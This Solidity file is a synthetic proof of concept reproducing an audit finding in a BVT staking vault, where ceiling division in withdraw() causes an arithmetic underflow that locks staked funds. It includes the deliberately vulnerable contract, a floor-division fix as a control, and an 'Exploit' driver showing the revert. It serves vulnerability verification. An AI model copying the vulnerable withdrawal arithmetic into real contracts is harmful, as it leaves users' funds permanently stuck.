// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Terplayer (BVT Staking&Distribution)
// finding 62638 [C-01]:
// "Withdrawal Calculation Causes Underflow, Locking All User Funds".
//
// BvtRewardVault.withdraw() iterates the caller's delegation list (which INCLUDES
// the caller themselves) and, for each delegated user, computes the withdrawn
// portion with CEILING division:
//     withdrawAmount = (delegatedAmount * amount + stakes - 1) / stakes
// Because every term is rounded UP, the sum of the per-delegatee withdrawals
// (totalDelegatedAmount) can exceed the requested `amount`. The final line
//     remainingAmount = amount - totalDelegatedAmount
// then underflows (Solidity 0.8 arithmetic Panic 0x11), so the whole withdraw()
// reverts. A legitimately-staked position can no longer be withdrawn through the
// normal path — the funds are stuck behind a permanently-reverting withdraw.
//
// The repo (batoshidao/berabtc-vault-token @ c68f412) is dead (404), but the
// complete vulnerable arithmetic is embedded verbatim in the finding, so no
// external source is required. The vulnerable loop is inlined byte-for-byte below
// (marked `// @>`). The only doubles are a minimal ERC20 (the staked BVT token +
// the LOCKED-BVT harm marker) — never the vulnerable boundary itself.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Minimal ERC20 double. The vault custodies the staked BVT; the marker
///      token records the locked (un-withdrawable) magnitude to the SINK.
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract. The withdraw() delegated-stake loop is inlined verbatim
// from the finding; the ceiling-division line is the defect (`// @>`).
// ─────────────────────────────────────────────────────────────────────────────
contract BvtRewardVault {
    MiniToken public bvt;

    // Faithful minimal accounting: the caller's total stake, per-delegatee
    // delegated stake, and the caller's delegation list (which includes self).
    mapping(address => uint256) public stakes;
    mapping(address => mapping(address => uint256)) public delegatedStakes;
    mapping(address => address[]) internal delegatedUsers;

    constructor(address _bvt) {
        bvt = MiniToken(_bvt);
    }

    /// @notice Test helper: seed one staker's position + delegation list.
    function seed(
        address staker,
        uint256 stakeAmount,
        address[] memory dUsers,
        uint256[] memory dAmounts
    ) external {
        stakes[staker] = stakeAmount;
        delete delegatedUsers[staker];
        for (uint256 i = 0; i < dUsers.length; i++) {
            delegatedUsers[staker].push(dUsers[i]);
            delegatedStakes[staker][dUsers[i]] = dAmounts[i];
        }
    }

    /// @dev Faithful minimal effect of an actual delegated withdrawal: return the
    ///      staked BVT to the recipient. Out of scope for the bug (the defect is
    ///      the calculation above), and never reached on the buggy path because
    ///      the `remainingAmount` subtraction underflows first.
    function _delegateWithdraw(address, /*from*/ address to, uint256 amount) internal {
        bvt.transfer(to, amount);
    }

    function withdraw(uint256 amount) external {
        address[] memory users = delegatedUsers[msg.sender];
        uint256 totalDelegatedAmount = 0;

        // Calculate and withdraw from delegated stakes
        for (uint256 i = 0; i < users.length; i++) {
            address user = users[i];
            uint256 delegatedAmount = delegatedStakes[msg.sender][user];
            if (delegatedAmount > 0) {
                uint256 withdrawAmount = (delegatedAmount * amount + stakes[msg.sender] - 1)  / stakes[msg.sender]; // @> ceiling division: every per-delegatee term rounds UP, so the sum overshoots `amount`
                if (withdrawAmount > 0) {
                    totalDelegatedAmount += withdrawAmount;
                    _delegateWithdraw(msg.sender, user, withdrawAmount);
                }
            }
        }
        // Calculate remaining amount to withdraw from user's own stake
        uint256 remainingAmount = amount - totalDelegatedAmount; // underflow (Panic 0x11) when totalDelegatedAmount > amount → whole withdraw() reverts, funds locked
        if (remainingAmount > 0) {
            _delegateWithdraw(msg.sender, msg.sender, remainingAmount);
        }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// FIXED contract (negative control): identical structure, but FLOOR division as
// recommended in the finding ("consider using floor division ... to prevent
// over-calculation"). The per-delegatee terms round DOWN, so their sum never
// exceeds `amount`, `remainingAmount` never underflows, and the SAME legitimate
// withdraw() succeeds.
// ─────────────────────────────────────────────────────────────────────────────
contract BvtRewardVaultFixed {
    MiniToken public bvt;

    mapping(address => uint256) public stakes;
    mapping(address => mapping(address => uint256)) public delegatedStakes;
    mapping(address => address[]) internal delegatedUsers;

    constructor(address _bvt) {
        bvt = MiniToken(_bvt);
    }

    function seed(
        address staker,
        uint256 stakeAmount,
        address[] memory dUsers,
        uint256[] memory dAmounts
    ) external {
        stakes[staker] = stakeAmount;
        delete delegatedUsers[staker];
        for (uint256 i = 0; i < dUsers.length; i++) {
            delegatedUsers[staker].push(dUsers[i]);
            delegatedStakes[staker][dUsers[i]] = dAmounts[i];
        }
    }

    function _delegateWithdraw(address, /*from*/ address to, uint256 amount) internal {
        bvt.transfer(to, amount);
    }

    function withdraw(uint256 amount) external {
        address[] memory users = delegatedUsers[msg.sender];
        uint256 totalDelegatedAmount = 0;

        for (uint256 i = 0; i < users.length; i++) {
            address user = users[i];
            uint256 delegatedAmount = delegatedStakes[msg.sender][user];
            if (delegatedAmount > 0) {
                // FIX: floor division — the sum of the per-delegatee terms is <= amount.
                uint256 withdrawAmount = (delegatedAmount * amount) / stakes[msg.sender];
                if (withdrawAmount > 0) {
                    totalDelegatedAmount += withdrawAmount;
                    _delegateWithdraw(msg.sender, user, withdrawAmount);
                }
            }
        }
        uint256 remainingAmount = amount - totalDelegatedAmount;
        if (remainingAmount > 0) {
            _delegateWithdraw(msg.sender, msg.sender, remainingAmount);
        }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: seed a legitimate 3-BVT staked position whose delegation list
// includes the staker themselves plus two delegatees, each holding an equal 1/3
// share. A legitimate partial withdraw of 2 BVT reverts on the vulnerable vault
// (ceiling shares 0.667+0.667+0.667 → 3 rounded units > 2 → remainingAmount
// underflows), but succeeds on the fixed vault. The blocked (locked) magnitude
// is recorded on the LOCKED-BVT marker to the SINK.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    // Two co-delegatees of the staked position.
    address internal constant USER_A = address(0xAAAA);
    address internal constant USER_B = address(0xBBBB);

    uint256 internal constant STAKE = 3 ether; // total staked BVT position
    uint256 internal constant WITHDRAW_AMT = 2 ether; // legitimate partial withdrawal the staker attempts

    // Exposed results for the driver / Playground.
    bool public buggyReverted;
    bool public fixedSucceeded;
    uint256 public vaultBalAfterBuggy; // buggy vault BVT balance after the failed withdraw (== STAKE → locked)
    uint256 public vaultBalAfterFixed; // fixed vault BVT balance after the successful withdraw
    uint256 public lockedMarker; // magnitude minted to SINK
    uint256 public sinkMarkerBalance;
    address public vaultAddr;
    address public vaultFixedAddr;
    address public bvtAddr;
    address public markerAddr;

    function run() external payable {
        // --- deploy vuln + doubles + marker (marker LAST) ---
        MiniToken bvt = new MiniToken("BeraBTC Vault Token", "BVT"); // nonce 1
        BvtRewardVault vault = new BvtRewardVault(address(bvt)); // nonce 2 (VULNERABLE)
        BvtRewardVaultFixed vaultFixed = new BvtRewardVaultFixed(address(bvt)); // nonce 3 (control)
        MiniToken marker = new MiniToken("Locked BVT", "LOCKED-BVT"); // nonce 4 (LAST)

        bvtAddr = address(bvt);
        vaultAddr = address(vault);
        vaultFixedAddr = address(vaultFixed);
        markerAddr = address(marker);

        // The staker is this contract (so msg.sender inside withdraw() == staker).
        address staker = address(this);

        // Delegation list INCLUDES the staker (the reported bug) plus two others,
        // each holding an equal 1/3 of the 3-BVT position.
        address[] memory dUsers = new address[](3);
        dUsers[0] = staker; // self-inclusion in the delegation list
        dUsers[1] = USER_A;
        dUsers[2] = USER_B;
        uint256[] memory dAmounts = new uint256[](3);
        dAmounts[0] = 1 ether;
        dAmounts[1] = 1 ether;
        dAmounts[2] = 1 ether;

        // Fund + seed the vulnerable vault and the fixed vault identically.
        bvt.mint(address(vault), STAKE);
        vault.seed(staker, STAKE, dUsers, dAmounts);

        bvt.mint(address(vaultFixed), STAKE);
        vaultFixed.seed(staker, STAKE, dUsers, dAmounts);

        // --- BUGGY PATH: legitimate 2-BVT withdraw reverts on underflow ---
        try vault.withdraw(WITHDRAW_AMT) {
            buggyReverted = false;
        } catch {
            buggyReverted = true;
        }
        // Nothing was withdrawn: the vault still holds the entire staked position.
        vaultBalAfterBuggy = bvt.balanceOf(address(vault));

        // --- CONTROL PATH: identical withdraw succeeds on the fixed vault ---
        try vaultFixed.withdraw(WITHDRAW_AMT) {
            fixedSucceeded = true;
        } catch {
            fixedSucceeded = false;
        }
        vaultBalAfterFixed = bvt.balanceOf(address(vaultFixed));

        // Harm holds: the buggy vault permanently reverts (funds locked) while the
        // fixed vault releases the funds for the very same legitimate request.
        require(buggyReverted, "buggy withdraw must revert (underflow)");
        require(fixedSucceeded, "fixed withdraw must succeed");
        require(vaultBalAfterBuggy == STAKE, "buggy vault retains full locked position");

        // Record the locked (un-withdrawable) magnitude on the marker to the SINK.
        lockedMarker = WITHDRAW_AMT;
        marker.mint(SINK, lockedMarker);
        sinkMarkerBalance = marker.balanceOf(SINK);
    }
}
